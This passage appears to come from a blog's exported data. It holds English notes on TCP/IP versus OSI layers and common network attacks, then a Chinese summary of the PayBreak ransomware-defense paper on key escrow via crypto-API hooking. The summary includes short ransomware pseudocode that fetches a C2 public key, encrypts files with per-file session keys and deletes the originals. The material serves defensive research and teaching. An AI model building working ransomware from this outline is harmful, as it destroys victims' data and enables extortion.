simpler components. But when we talk about the TCP/IP model, it was designed and developed by Department of Defense (DoD) in 1960s and is based on standard protocols. It stands for Transmission Control Protocol/Internet Protocol. The TCP/IP model is a concise version of the OSI model. It contains four layers, unlike seven layers in the OSI model. The layers are: Process/Application Layer Host-to-Host/Transport Layer Internet Layer Network Access/Link Layer The diagrammatic comparison of the TCP/IP and OSI model is as follows : Difference between TCP/IP and OSI Model: TCP/IP OSI TCP refers to Transmission Control Protocol. OSI refers to Open Systems Interconnection. TCP/IP has 4 layers. OSI has 7 layers. TCP/IP is more reliable OSI is less reliable TCP/IP does not have very strict boundaries. OSI has strict boundaries TCP/IP follow a horizontal approach. OSI follows a vertical approach. TCP/IP uses both session and presentation layer in the application layer itself. OSI uses different session and presentation layers. TCP/IP developed protocols then model. OSI developed model then protocol. Transport layer in TCP/IP does not provide assurance delivery of packets. In OSI model, transport layer provides assurance delivery of packets. TCP/IP model network layer only provides connection less services. Connection less and connection oriented both services are provided by network layer in OSI model. Protocols cannot be replaced easily in TCP/IP model. While in OSI model, Protocols are better covered and is easy to replace with the change in technology. The first layer is the Process layer on the behalf of the sender and Network Access layer on the behalf of the receiver. During this article, we will be talking on the behalf of the receiver. 1. Network Access LayerThis layer corresponds to the combination of Data Link Layer and Physical Layer of the OSI model. It looks out for hardware addressing and the protocols present in this layer allows for the physical transmission of data.We just talked about ARP being a protocol of Internet layer, but there is a conflict about declaring it as a protocol of Internet Layer or Network access layer. It is described as residing in layer 3, being encapsulated by layer 2 protocols. 2. Internet LayerThis layer parallels the functions of OSI’s Network layer. It defines the protocols which are responsible for logical transmission of data over the entire network. The main protocols residing at this layer are : IP stands for Internet Protocol and it is responsible for delivering packets from the source host to the destination host by looking at the IP addresses in the packet headers. IP has 2 versions:IPv4 and IPv6. IPv4 is the one that most of the websites are using currently. But IPv6 is growing as the number of IPv4 addresses are limited in number when compared to the number of users. ICMP stands for Internet Control Message Protocol. It is encapsulated within IP datagrams and is responsible for providing hosts with information about network problems. ARP stands for Address Resolution Protocol. Its job is to find the hardware address of a host from a known IP address. ARP has several types: Reverse ARP, Proxy ARP, Gratuitous ARP and Inverse ARP. 3. Host-to-Host LayerThis layer is analogous to the transport layer of the OSI model. It is responsible for end-to-end communication and error-free delivery of data. It shields the upper-layer applications from the complexities of data. The two main protocols present in this layer are : Transmission Control Protocol (TCP) It is known to provide reliable and error-free communication between end systems. It performs sequencing and segmentation of data. It also has acknowledgment feature and controls the flow of the data through flow control mechanism. It is a very effective protocol but has a lot of overhead due to such features. Increased overhead leads to increased cost. User Datagram Protocol (UDP) On the other hand does not provide any such features. It is the go-to protocol if your application does not require reliable transport as it is very cost-effective. Unlike TCP, which is connection-oriented protocol, UDP is connectionless. 4. Application LayerThis layer performs the functions of top three layers of the OSI model: Application, Presentation and Session Layer. It is responsible for node-to-node communication and controls user-interface specifications. Some of the protocols present in this layer are: HTTP, HTTPS, FTP, TFTP, Telnet, SSH, SMTP, SNMP, NTP, DNS, DHCP, NFS, X Window, LPD. Have a look at Protocols in Application Layer for some information about these protocols. Protocols other than those present in the linked article are : HTTP and HTTPS HTTP stands for Hypertext transfer protocol. It is used by the World Wide Web to manage communications between web browsers and servers. HTTPS stands for HTTP-Secure. It is a combination of HTTP with SSL(Secure Socket Layer). It is efficient in cases where the browser need to fill out forms, sign in, authenticate and carry out bank transactions. SSH SSH stands for Secure Shell. It is a terminal emulations software similar to Telnet. The reason SSH is more preferred is because of its ability to maintain the encrypted connection. It sets up a secure session over a TCP/IP connection. NTP NTP stands for Network Time Protocol. It is used to synchronize the clocks on our computer to one standard time source. It is very useful in situations like bank transactions. Assume the following situation without the presence of NTP. Suppose you carry out a transaction, where your computer reads the time at 2:30 PM while the server records it at 2:28 PM. The server can crash very badly if it’s out of sync. Hybrid model Layered Internet protocol stack In the real world, we use a mix of both the OSI model and the TCP/IP model, called the Hybrid model. In the Hybrid model, the Application layer is a combination of layer 7, layer 6 and layer 5 of OSI model (similar to TCP/IP model). The remaining layers (layer 1, 2, 3 and 4) are the same as the OSI model. application: supporting network applications HTTP, IMAP, SMTP, DNS transport: process-process data transfer TCP, UDP network: routing of datagrams from source to destination IP, routing protocols link: data transfer between neighboring network elements Ethernet, 802.11 (Wi-Fi), PPP physical: bits “on the wire” Services, Layering and EncapsulationWatch the courseware and instructional videos for more details. 1.6 Basic Network Attacks in Computer Network Networks Under Attack Many people rely on the Internet for many of their professional, social and personal activities. But there are also people who attempt to damage our Internet-connected computers, violate our privacy and render inoperable the Internet services. Given the frequency and variety of existing attacks as well as the threat of new and more destructive future attacks, network security has become a central topic in the field of computer networking. How are computer networks vulnerable? What are some of the more prevalent types of attacks today? Malware – short for malicious software which is specifically designed to disrupt, damage, or gain authorized access to a computer system. Much of the malware out there today is self-replicating: once it infects one host, from that host it seeks entry into other hosts over the Internet, and from the newly infected hosts, it seeks entry into yet more hosts. In this manner, self-replicating malware can spread exponentially fast. Virus – A malware which requires some form of user’s interaction to infect the user’s device. The classic example is an e-mail attachment containing malicious executable code. If a user receives and opens such an attachment, the user inadvertently runs the malware on the device. Worm – A malware which can enter a device without any explicit user interaction. For example, a user may be running a vulnerable network application to which an attacker can send malware. In some cases, without any user intervention, the application may accept the malware from the Internet and run it, creating a worm. Botnet – A network of private computers infected with malicious software and controlled as a group without the owners’ knowledge, e.g. to send spam. DoS (Denial of Service) – A DoS attack renders a network, host, or other pieces of infrastructure unusable by legitimate users. Most Internet DoS attacks fall into one of three categories : • Vulnerability attack: This involves sending a few well-crafted messages to a vulnerable application or operating system running on a targeted host. If the right sequence of packets is sent to a vulnerable application or operating system, the service can stop or, worse, the host can crash. • Bandwidth flooding: The attacker sends a deluge of packets to the targeted host—so many packets that the target’s access link becomes clogged, preventing legitimate packets from reaching the server. • Connection flooding: The attacker establishes a large number of half-open or fully open TCP connections at the target host. The host can become so bogged down with these bogus connections that it stops accepting legitimate connections. DDoS (Distributed DoS) – DDoS is a type of DOS attack where multiple compromised systems, are used to target a single system causing a Denial of Service (DoS) attack. DDoS attacks leveraging botnets with thousands of comprised hosts are a common occurrence today. DDoS attacks are much harder to detect and defend against than a DoS attack from a single host. Packet sniffer – A passive receiver that records a copy of every packet that flies by is called a packet sniffer. By placing a passive receiver in the vicinity of the wireless transmitter, that receiver can obtain a copy of every packet that is transmitted! These packets can contain all kinds of sensitive information, including passwords, social security numbers, trade secrets, and private personal messages. some of the best defenses against packet sniffing involve cryptography. IP Spoofing – The ability to inject packets into the Internet with a false source address is known as IP spoofing, and is but one of many ways in which one user can masquerade as another user. To solve this problem, we will need end-point authentication, that is, a mechanism that will allow us to determine with certainty if a message originates from where we think it does. Man-in-the-Middle Attack – As the name indicates, a man-in-the-middle attack occurs when someone between you and the person with whom you are communicating is actively monitoring, capturing, and controlling your communication transparently. For example, the attacker can re-route a data exchange. When computers are communicating at low levels of the network layer, the computers might not be able to determine with whom they are exchanging data. Compromised-Key Attack – A key is a secret code or number necessary to interpret secured information. Although obtaining a key is a difficult and resource-intensive process for an attacker, it is possible. After an attacker obtains a key, that key is referred to as a compromised key. An attacker uses the compromised key to gain access to a secured communication without the sender or receiver being aware of the attack. Phishing – The fraudulent practice of sending emails purporting to be from reputable companies in order to induce individuals to reveal personal information, such as passwords and credit card numbers. DNS spoofing – Also referred to as DNS cache poisoning, is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolver’s cache, causing the name server to return an incorrect IP address. 第一次用英文做笔记，有语法错误的话见谅，毕竟只是一个低分飘过六级的小废物罢了。。。 Ps. 求第八版的PDF啊！不是中文searchable的也行啊！现在只能第七版的和slides混着看。。。。 Referencehttp://gaia.cs.umass.edu/kurose_ross/index.html ↩https://www.whoismyisp.org/articles/what-is-an-isp ↩https://www.differencebetween.com/difference-between-throughput-and-vs-bandwidth/ ↩Speed vs Bandwidth Explained - Arvig ↩https://speed.cloudflare.com/ ↩https://www.geeksforgeeks.org/layers-of-osi-model/ ↩","categories":[],"tags":[{"name":"Computer Networking","slug":"Computer-Networking","permalink":"https://mundi-xu.github.io/tags/Computer-Networking/"},{"name":"A Top-Down Approach","slug":"A-Top-Down-Approach","permalink":"https://mundi-xu.github.io/tags/A-Top-Down-Approach/"},{"name":"notes","slug":"notes","permalink":"https://mundi-xu.github.io/tags/notes/"},{"name":"Introduction","slug":"Introduction","permalink":"https://mundi-xu.github.io/tags/Introduction/"},{"name":"OSI Model","slug":"OSI-Model","permalink":"https://mundi-xu.github.io/tags/OSI-Model/"},{"name":"TCP/IP Model","slug":"TCP-IP-Model","permalink":"https://mundi-xu.github.io/tags/TCP-IP-Model/"}]},{"title":"PayBreak防勒索系统简析","slug":"PayBreak防勒索系统简析","date":"2021-01-01T02:05:21.000Z","updated":"2021-01-06T05:12:53.244Z","comments":true,"path":"2021/01/01/PayBreak防勒索系统简析/","link":"","permalink":"https://mundi-xu.github.io/2021/01/01/PayBreak%E9%98%B2%E5%8B%92%E7%B4%A2%E7%B3%BB%E7%BB%9F%E7%AE%80%E6%9E%90/","excerpt":"PayBreak是一种创新开源的保护机制，可以解决大部分基于混合加密的勒索软件的威胁。","text":"本文整理翻译自PayBreak : Defense Against Cryptographic Ransomware 简介PayBreak基于假设：文件加密依赖于混合加密（译者注：详见我的另一篇文章），其中在受害计算机上使用对称密钥。 PayBreak检测到这些密钥的使用，将它们保存在托管中，因此可以解密文件，否则这些文件只能通过支付赎金才能恢复。 我们认为应对勒索软件威胁的现有技术存在不足（译者注：该文发表自2017年）， 取而代之的是，我们提出了一种系统，允许有安全意识的用户主动防御勒索软件攻击。，它可以使受害者从勒索软件感染中恢复而无需支付赎金。 为此，我们提出了一种密钥托管机制，该机制可将加密密钥安全地存储在密钥库中。 第一步，用户必须生成一个非对称密钥对，并将公钥添加到系统中。 此公共密钥用于加密放置在密钥库中的密钥。 在正常运行期间，我们的系统监视在系统上执行的程序，并拦截对实现密码原语的函数的调用。 此外，系统会捕获对称加密密钥，并使用公钥对其进行加密，然后将结果存储在密钥库中。 一旦用户感染了勒索软件并得知必须支付赎金才能访问文件，其可以简单地用私钥解密密钥库并解密文件而无需支付任何费用。 经测试，PayBreak系统运行了107种勒索病毒样本（12个家族），成功的恢复了所有加密文件。 贡献 对基于现代加密技术的勒索软件进行了特征分析 提出了一种密钥库机制，该机制可以主动防御基于加密的勒索软件 在Windows 7操作系统下实现了PayBreak系统 通过在受控环境中运行107个勒索软件样本来评估PayBreak，并成功恢复了十二个常见勒索软件家族的任何一个加密的所有文件 测试了PayBreak对操作系统和日常使用的性能影响 背景在本节中，我们将讨论现代勒索软件的典型加密流程以及影响勒索软件的实际限制，同时简单介绍PayBreak系统基于的威胁模型。 Practical considerations for ransomware勒索软件的目标是阻止受害者访问其数据并勒索赎金。现代勒索软件借鉴了完善的良性密码套件（例如OpenPGP或S/MIME）中的技术，并采用了所谓的混合密码系统。 在混合密码系统中，发送者为每个消息（例如，为每个需要加密的文件）选择一个随机对称密钥，并在该密钥下加密每个消息（或文件）。该一次对称密钥通常称为会话密钥。随后，混合密码系统将使用接收者的（非对称）公钥对对称消息专用密钥进行加密。因此，无论加密内容的大小如何，仅需要高性能的非对称对称加密操作即可加密小的对称密钥。然后，将加密的对称密钥与加密的内容组合并发送到服务器。为了解密数据，接收者首先使用其私钥解密加密的对称密钥。有了对称密钥，接收者便可以简单地将数据的密文解密为原始的纯文本。[1] 在勒索软件攻击中，攻击者在其攻击服务器上生成了非对称密钥对。 在受害者的机器上，恶意软件会为每个加密的文件生成唯一的对称会话密钥。 会话密钥使用攻击者的公共密钥加密，并与加密的文件内容一起存储。 然后，攻击者向受害者索要赎金以获取指定的私钥解密文件。 Hybrid Cryptography如前所述，对称密钥由非对称公钥保护（加密）。在勒索软件的攻击链中，混合加密系统下加密的消息是受害者计算机上的文件。因此，最终勒索软件攻击的强度就等价于混合密码系统的安全性。基于此事实，被加密的用户文件的后验救援尝试是很具有挑战性的。因此，我们提供了一种保护机制，可以绕过现代勒索软件样本所采用的强密码原语的挑战，而不是简单地检测到受害者计算机是否已感染了勒索软件。 尽管以上讨论似乎是理论性的，但现代勒索软件系列恰恰利用了这种混合密码系统。许多操作系统发行版和平台都包含经过实践检验的加密算法。例如， 在Windows上，一种这样的实现是Microsoft的CryptoAPI。 CryptoAPI是用于加密功能的安全接口，可以确保在每个Windows操作系统中都存在该接口，因此对于勒索软件作者而言，利用现有的加密功能非常简单。 Ransomware Pseudocode12345678910111213141516171819c2 = ConnectToCommandAndControl();// Private key kept secret on C2pubkey = c2.ReceivePubKey();hPubkey = CryptImport(pubkey);hCsp = CryptAcquireContext();while (filename = FindNextFile()) &#123; // Read ptFile = ReadFile(filename); // Generate random session key per file hSymkey = CryptGenKey(hCsp); // Then encrypt ctFile = CryptEncrypt(hSymkey, ptFile); keyblob = CryptExportKey(hPubkey, hSymkey); DeleteFile(filename); // Write encrypted session key WriteFile(filename, keyblob); // Append the encrypted file AppendFile(filename, ctFile);&#125; Threat model本节介绍了我们提出的系统的威胁模型和假设。关于这些假设的详细讨论以及我们为什么认为它们是现实的，请参见后文第6节的讨论部分。我们的威胁模型基于常见且成功的勒索软件，因此，威胁模型考虑已在受害者计算机上成功安装且可运行恶意软件的攻击者。此外，我们的威胁模型中的操作系统是可信和经常维护更新的，即我们假设恶意软件不能提权，因为这也会破坏任何现有的计算机保护机制（如反恶意软件解决方案）。即使我们假设勒索软件仅以用户级特权执行，但大多数现代恶意软件都是被加壳过的。因此，我们的威胁模型假设恶意软件仅由普通的软件加壳。更准确地说，威胁模型只考虑可以运行时脱壳的二进制文件，而不考虑那些应用高级策略或基于仿真的加壳软件（如Themida）。 我们承认，更复杂的壳和混淆技术可能会破坏我们提出的系统。尽管此类技术已广为人知，但这些技术在整个恶意软件社区中并未受到广泛应用，而且至少我们提出的方法大大提高了恶意软件作者绕过保护的门槛（即攻击者必须克服这些难题）。 最后，我们假设用户可以创建一个非对称密钥对来使用我们的系统，并且在感染勒索软件之前就完成了系统设置（即勒索软件的加密操作发生在系统构建完成之后）。 概述PayBreak系统由三个不同的组件构成，该系统能够恢复由混合密码系统勒索软件加密的文件。 在本节中，我们将简单介绍这些组件及其在系统中的作用。 下图概述了PayBreak的工作方案。 用户使用非对称密钥对（pku，sku）的公钥（pku）配置PayBreak，而私钥（sku）存储在可信设备上。 系统将计算机上使用的所有加密会话密钥连续存储在安全密钥库中，当用户的计算机不幸感染勒索软件时，则可以使用私钥sku访问系统的密钥库，然后使用存储在密钥库中的数据解密文件。 该系统利用了以下事实：在混合密码系统中，攻击者必须在对称加密期间使用会话密钥。 在实际的勒索软件攻击中，这种加密必须在用户的计算机上进行。 基于这一特征，我们可以绕过对现代勒索软件所采用的强大加密技术的破解。 Crypto Function Hooking勒索软件的作者需要安全可靠的现代加密技术，因此，当今的恶意软件作者可以选择动态链接（系统提供的）密码库，也可以将外部库静态链接到他们的代码中。 PayBreak支持两种类型的链接方式，并通过它们的名称和地址识别动态链接库中的加密过程，而静态链接过程则基于模糊字节签名（译者注：疑似模糊哈希算法的应用）进行标识。然后在这些过程的位置生成hook。Hook从这些加密过程改变程序控制流，并导出会话密钥以及对称加密方案的其他任何参数。导出数据后，系统将控制权返回到原始加密过程，程序继续正常进行。 Key Vault用于恢复对称加密数据的密钥材料和算法详细信息（如上所述，从hook过程中恢复并提取导出）存储在安全加密的密钥库中。由于勒索软件可能以密钥库为目标，我们的实现将获取的密钥存储到一个Append-Only的文件中，且该文件受管理员权限保护。在我们的测试中，这种完整性机制已经足够。但是，我们在第六节中讨论了进一步的关键库完整性改进。 密钥库的内容使用用户的公共密钥安全地加密，由于在存储之前已对其进行过加密，我们确保密钥库对用户而言是安全的。 File Recovery假如用户不幸感染了勒索软件且文件都被加密，则可以使用用户的私钥sku访问密钥库。 PayBreak用于访问加密被勒索的文件时的密钥和算法信息。算法详细信息用于配置与加密时相同的对称加密方案，并且使用保存的密钥与该配置一起尝试恢复文件。 因为勒索软件通常会存储元数据，例如原始文件长度，加密日期和加密密钥数据等信息，所以在加密开始时，实际的加密文件数据通常会在该元数据的固定偏移处。在解密之前，PayBreak将通过测试确定加密文件的正确偏移。 详细实现我们在Windows7上实现了原型系统PayBreak，主要部分为Hook由Microsoft的Crypto API和Crypto++库执行的加密。该实现还使用了微软CryptoAPI中的加密技术来安全地存储勒索软件使用的会话密钥。 Crypto Function HookingHooking是一种通过使用任意新函数修改原始函数来改变应用程序行为的技术。在Windows中，可以通过多种方式来hook函数，范围从修改进程的“Import Address Table”到注入DLL。我们的原型系统使用Microsoft Research的Detours库进行hooking。Detours首先从原始函数的内存地址的开头至少保存5个字节（x86汇编中无条件的JMP指令的大小）来hook函数。由于x86体系结构中的指令长度可变，保存的字节数可能超过5个字节。Hook函数还会包含需要添加的新代码，对PayBreak而言，就是将会话密钥和算法参数导出到密钥库。在新创建的hook函数末尾，Detours会创建一条无条件跳转指令，将控制权移回原始函数并跳过hook函数。即在每个函数的前5个字节（可能更多）放一个jmp，跳到hook函数，hook函数结尾再jmp回原控制流处。 为了激活hook并将程序控制流从原始函数重定向到hook函数，对hook函数的jmp将覆盖原始函数中的前五个字节。这样就完成了hooking，并且对原始函数的所有调用现在都将重定向到hook。我们的系统采用此方案进行hooking，并将其自身插入Windows 7计算机上启动的每个新进程中。 勒索软件作者一般通过动态链接到系统提供的加密库或静态链接外部库以将加密技术纳入其恶意软件中，这两种链接方式给系统的hooking带来了不同的困难。 Hooking in dynamically linked libraries几十年来，Windows一直将功能丰富的加密库作为其平台的一部分，从而使得恶意软件很容易动态链接到Windows上的加密库。微软的CryptoAPI只允许通过一组具有特殊访问权限的子例程进行操作，从而隐藏密钥及其在内存中的位置等敏感信息。CryptoAPI的安全性、平台一致性和API完整性使其成为勒索软件作者进行本地文件加密的常用选择。微软的CNG库是经典CryptoAPI的可选替代品（两者都包含在windows7中），但使用方式基本相同，PayBreak也能无缝切换处理。 由于CryptoAPI抽象和不透明的设计，会话密钥的使用和导出只能通过特定的CryptoAPI过程来完成。通过CryptoAPI进行的所有加密都必须通过CryptEncrypt函数执行，或者必须通过CryptExport函数导出（供外部使用）。基于CryptoAPI的勒索软件使用CryptoAPI的CryptEncrypt函数来执行文件的本地加密。因为CryptoAPI是动态链接的，所以添加hook完全独立于调用过程，并且恶意软件的混淆不会影响此功能。利用在CryptEncrypt中配置的hook，PayBreak可以使用CryptExport API函数安全地导出会话密钥。 虽然CryptEncrypt中的hook函数成功导出了会话密钥，但并未包含诸如加密模式和初始化向量之类的算法详细信息。为了获得这些参数，然后重新恢复相同的加密配置，我们的系统挂接了CryptAcquireContext和CryptSetKeyParam函数。CryptAcquireContext的hook函数为PayBreak提供了用于加密的算法信息，包括默认参数。对这些参数的更改是使用CryptSetKeyParam函数执行的，同样的此API函数也已被hooking。 除了使用CryptoAPI进行加密之外，用户可能希望使用API来生成安全的加密用随机数，而该随机数可用于导出另一个加密功能的会话密钥。就Window而言，生成随机数的受支持的API是CryptGenRandom，许多加密库（如OpenSSL，NaCl，LibTomCrypt等）都利用此API来实现其加密安全的伪随机数生成器（CSPRNG）。通过动态hooking并记录此系统函数，PayBreak存储用于生成许多会话密钥的基础信息，这些会话密钥将在勒索软件动态或静态链接这些库时所使用。 Hooking in statically linked libraries静态链接加密库的勒索软件迫使PayBreak采用稍微不同的方法。静态链接的库嵌入在应用程序的可执行代码中，会受到混淆的影响。因此，PayBreak会在运行时从进程的内存中识别加密过程，然后hooking。为此，我们的系统使用32字节的 fuzzy function signatures 来标识静态链接的库函数。这种方法类似于IDA的快速库识别和识别技术（FLIRT）。 签名由已知加密过程的前32个字节组成，当在内存中连续识别到这32个字节且超过阈值百分比时，系统将标识该进程。因为通常恶意软件会被加壳，所以PayBreak会扫描所有已执行进程的可执行内存，以查找函数签名。我们的原型系统将在每个进程第一次调用NtReadFile之后执行扫描，因为恶意软件必须先读取数据才能加密用户文件。识别到函数签名后，通过使用Detours去hook并导出会话密钥和加密算法的详细信息。尽管我们当前的原型系统可以有效抵御当代勒索软件，但高级加壳技术和混淆仍然可以绕过保护系统。可以利用对加密功能的语义检测加强对勒索软件的识别[2]。 我们的原型系统实现带有Crypto++静态链接库的签名，由Crypto++的SetKey，CipherModeBase和SymmetricCipherBase类方法的前32个字节组成，并通过CryptoAPI的CryptExport API函数导出Crypto++会话密钥和算法详细信息。 Key Vault我们假设Microsoft CryptoAPI和Crypto++使用的对称密钥和有关对称加密方案的详细信息使用安全的方法存储，只有在必要时才能由勒索软件的受害者访问。我们可以发现PayBreak的密钥库系统的设计与勒索软件部署的混合密码系统极其相似，都使用系统安装过程中生成的用户公共密钥（pku）对会话密钥进行加密和导出。我们的实现为此步骤使用的是2048位RSA密钥，可确保对小于或等于密钥大小的数据进行安全的加密-对于一般的256位对称密钥而言已经足够。 如前一节所述，CryptExcrypt函数的行为增加了对CryptEncrypt的调用。CryptExport调用会将传递给CryptEncrypt函数的会话密钥的句柄以及我们系统的交换密钥（即用户的pku）作为参数以安全地导出会话密钥，同时CryptEncrypt也会导出使用密钥的算法（即AES，3DES，RC4等）信息。 此外，为了重建勒索软件感染所使用的对称加密配置，我们必须保存算法参数，例如初始化向量（IV）和使用的分组密码模式等，这些信息都是从hook中提取的。Hook对传递给CryptAcquireContext和CryptSetKeyParam函数的参数进行记录。与加密消息语法[3]相似，因为它们的公开不会影响现代密码系统的安全性，所以这些参数以明文形式连接到会话密钥信息。此串联的“blob”被附加到PayBreak的密钥库中。此外，如前所述，我们的原型实现将传递给Crypto++函数的加密密钥信息（简单字节数组）存储到密钥库中。系统还存储从CryptGenRandom函数调用的可用于逆向勒索软件以重新创建用于加密文件的会话密钥输出的随机字节。 为安全起见，防止文件库本身被勒索软件加密，文件库配置为append-only，并且仅允许Windows Administrator组进行所有其他访问。如果密钥库需要访问，则使用在安装PayBreak期间设置的私钥（sku）来解密存储的密钥材料，从而访问各个会话密钥和加密方案的参数。 File RecoveryPayBreak的最后一个组成部分是勒索软件感染期间加密的文件的恢复。文件恢复分三个阶段进行。首先使用存放的私钥访问密钥库，然后将保管库中的数据解析为对称密钥和相应的加密方案参数，例如块密码模式和初始化向量，最后把检索到的会话密钥用于解密受害者的文件。通常，由勒索软件加密的每个文件都与元数据（例如勒索软件版本和加密文件的原始大小）连接在一起。由于这种元数据，实际的加密文件数据通常会在为赎金而保留的文件中发生偏移。在不了解每个勒索软件的单独元数据结构的情况下，我们的系统被迫对保存在勒索文件中的每个可能偏移量进行测试。我们的系统利用动态编译来降低后续文件解密所需的工作量，一旦找到成功的偏移量，以后将在先前成功的偏移量处尝试文件解密。 PayBreak迭代尝试使用每个托管密钥和每个偏移量解密文件，直到达到解密状态（libmagic[4]未将其识别为“data”）为止。 一旦将解密状态标识为常见的Office文档文件类型，例如Microsoft Word文档，JPEG图像或PDF文件，该状态将另存为实际的解密文件。 当然，如果生成的文件被错误地标记为已解密，则用户可以指示系统继续搜索，直到标识了正确的键和偏移量为止。此外，尽管我们可以改进这种未优化的暴力破解方法，但至少它成功地恢复了测试的加密用户文件，有用就行不是吗。 测试评估如上一节所示，我们在Windows 7上实现了PayBreak。 基于此原型实现，我们对系统进行了测试评估并回答了以下问题： RQ1 PayBreak可以保护用户免受真实的勒索软件的威胁吗？（即PayBreak是否可以还原由市面上流通的勒索软件加密的文件） RQ2 是否需要对软件进行特定的修改才能还原不同勒索软件采用的加密？ RQ3 将PayBreak作为一种实时的在线保护机制运行会对性能产生什么影响？ 这些问题旨在回答所提出技术的实用性问题。 RQ1着重该技术是否有效。 显然，一个不能完成预定功能的系统在对抗勒索软件方面的帮助有限。 RQ2探索了所提出系统的多功能性。 在这种情况下，通用方法比需要不断完善以解决以前未知的勒索软件系列所面临的挑战的技术更为可取。 最后，RQ3解决了一个实际的部署问题。 与流行的防病毒解决方案类似，我们将PayBreak设计为一种在线保护机制，因此，对常见用例和工作负载的高性能影响将对在工作环境采用这种机制构成重大障碍。 Dataset为了测试PayBreak的功能和有效性，我们需要获取主动加密勒索软件的样本。 为了收集这些样本，我们开发了实时自动化的发现，检测和警告勒索软件（RADDAR）系统。 该项目将被开源，以帮助进一步研究勒索软件。 RADDAR会在各个位置抓取恶意软件样本。 更准确地说，我们从VirusTotal Intelligence获得了样本，该样本提供了针对恶意软件样本的高级搜索功能和下载功能。 我们搜索了新提交的样本（即在分析后一周内提交的样本），这些样本也被至少两个反病毒供应商标记，并且包含在List of Known Ransomware Families中。除了这些流行的勒索软件系列之外，我们还下载了基于通用搜索词的示例：勒索，加密或锁定。除VirusTotal外，我们还对各种恶意软件存储库进行了爬取，包括Malc0de和VXVault。 RADDAR一旦发现恶意软件样本，就会检测该恶意软件样本是否为基于加密的勒索软件，以及是否正在执行其恶意行为。 为此，我们利用了Cuckoo Sandbox动态分析框架，其中每个样本运行20分钟。 我们使用Cuckoo通过在KVM8中运行的受监视Windows 7虚拟机（VM）中执行每个样本来分析并输出每个样本的行为报告。此外，除了在纯净的Windows 7安装包中找到的默认文件之外，我们还通常在计算机上的各个目录中放置经过重新封装的文件类型（PDF，图像，源代码和Word文档）。 最后，我们在虚拟机中添加了PayBreak，这使我们能够执行此评估中介绍的测试。 我们拍摄了文件系统的快照，并将在感染之前在系统上找到的这些文件称为“honey files”（蜜罐）。 在由Cuckoo分析恶意软件样本之后，RADDAR会对Cuckoo结果进行分析，以生成包含各种指标的报告，其中包括样本是否处于活动状态以及PayBreak是否提取了加密期间使用的密钥。 基于以下特征，我们认为勒索软件样本处于活动状态： 覆盖，删除或重新创建至少一个honey file 新文件被libmagic标识为数据。 需要注意的是，libmagic已经成功标识了原始状态下honey files的真实内容，因此，如果类型更改为数据，则样本必须已对其进行了修改。 为了确定勒索软件的家族，我们对AV标签进行了多数表决（即采用与Kharraz等人相同的方法[5]）。我们让RADDAR运行了4个月，以收集和生成有关1,691个恶意软件样本的报告，其中713个与AV公司使用的勒索软件标签匹配。 下图给出了该分析的详细分类。 与之前的恶意软件研究一致，我们数据集中的许多样本由于各种原因没有显示任何恶意功能（即，它们处于非活动状态）。因此，我们进行了以下两步分析。首先，识别活动样本，然后尝试推断非活动样本未显示任何恶意行为的原因。如前所述，安全使用混合加密的勒索软件必须从命令和控制结构（C&amp;C）检索公钥pk。因此，如果恶意软件不产生任何网络流量，就无法安全地应用混合加密。如果所有观察到的TCP和UDP流量都专门针对Windows附属的域（例如用于计时和更新的域），则我们将样本分类为“无网络”。 此外，如果所有DNS查询（针对Microsoft域的查询除外）都返回否，或者所有HTTP请求均生成404状态代码，则将样本分类为“已禁用C＆C”。在分析的非活动样本中，那些报告为具有禁用的C＆C的样本都是由于DNS查询返回错误。但是，我们没有对由恶意软件生成的受HTTPS保护的网络流量进行分析。最后，即使C＆C可操作且可访问，但如果检测到环境敏感型恶意软件在沙盒环境中运行，它也将避免执行。 “Environment”表示恶意软件可能正在分析其环境以检测其是否在虚拟环境（例如KVM或VirtualBox）中运行。 如果Cuckoo的内置检测程序将样本标识为“Environment”，则该样本将被标记为“Environment”。 至于无法确定其余样品没有运行的原因，以前的经验表明，这可能是由于更高级的环境指纹识别，对用户活动的依赖性或逻辑（定时）炸弹的使用而导致执行延迟超过我们的20分钟评估阈值。最后，我们针对20个活跃的勒索软件系列评估了我们的系统，这是我们所知道的最大的勒索软件研究。 PayBreak Effectiveness在本部分中，我们回答RQ1，PayBreak可以还原真实勒索软件执行的加密吗？和RQ2一样，是否需要对恶意软件家族进行特定的修改才能还原不同勒索软件家族采用的加密？ PayBreak能够从具有已知加密签名的所有勒索软件系列中恢复被勒索的文件。我们的结果证实，我们能够成功融入现实勒索软件样本的加密功能并提取会话密钥以及用于文件恢复的所有必要材料。更具体地说，PayBreak击败了20个活跃勒索软件家族中的12个，据我们所知，其中9个以前从未被击败。如果存在可以完全恢复被勒索文件的方法或技术，那么这个勒索软件就是失败的。PayBreak成功恢复了由CryptoWall和Locky加密的文件，Locky是2016年在经济上最成功的三个勒索软件系列中的两个，而仅CryptoWall便获得了超过3.25亿美元的收入。 下表中显示了活跃勒索软件系列的摘要。给定系列的活跃勒索软件数量在Samples列中指定。对于以前被勒索的勒索软件样本，该列中包含相应的参考。我们不认为泄漏的加密密钥（例如从攻击者的服务器获得）是失败的，因为这是针对勒索软件的活动，并不意味着勒索软件系列的实施不力。PayBreak展示了使用多种加密库（包括Microsoft CryptoAPI和Crypto++）击败勒索软件的能力。 PayBreak在运行时为PayBreak成功的样本提取了用于加密的加密算法，并在“算法”列中列出。对于未成功的样本，该列包含其他研究人员研究的信息，这些信息是我们尽可能收集的，并提供了相应的参考。此外，“击败”列还标识了通过先前技术或PayBreak被击败的所有软件。 在我们的样本库中的20个活跃家庭中，PayBreak失败了8个。其中的三个DXXD，PokemonGo和VirLock先前被击败，其使用琐碎的常量密钥进行加密，即它们未使用混合加密。另外两个家庭，MarsJokes和Troldesh，也先前被击败。与流行的方式相反，这些系列使用了自己的伪随机数生成器，而不是使用经过了实战测试的CryptGenRandom API。其余没有成功的软件家族，Androm，Razy和TeslaCrypt使用一个密码库，而我们的原型实现并未设置为可hook的。 PayBreak可以扩展，以通过hooking它们各自的静态链接的加密功能，然后将其恒定密钥（对于琐碎的家族）导出，或将其会话密钥导出到密钥库中，从而击败其余八个家族。 接下来，我们讨论系统所使用签名的鲁棒性。 Signature 